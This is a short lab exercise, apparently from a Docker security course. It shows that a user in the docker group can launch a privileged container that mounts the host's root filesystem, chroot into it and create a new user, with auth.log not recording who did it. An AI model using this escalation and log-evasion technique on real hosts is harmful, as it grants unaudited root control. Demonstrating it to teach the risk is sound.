#Working on ubuntu => start 2 ssh sessions

#On session 2
sudo tail -f -n0 /var/log/auth.log

#On session 1
docker images

sudo !!

#On session 2 see the activities

#On session 1 add $USER to the docker group
sudo gpasswd -a $USER docker

exit

vagrant ssh ubuntu

id

#Use docker
docker images

#On session 2 no activities are logged

#On session 1
ls /home

#Now something really bad
docker run -it --name bad --privileged -v /:/host ubuntu chroot /host

useradd -m bob

exit

#Now we have new user home
ls /home

sudo docker rm bad

#On session 2 the activities are logged but no user info



The details of the command we will see later but we are running a Linux Ubuntu container,
mapping the root volume of the host to the /host directory in the container. The container
starts by executing the command to chroot to the host directory. We now have full control
over the host system. Without using sudo, this would not be logged.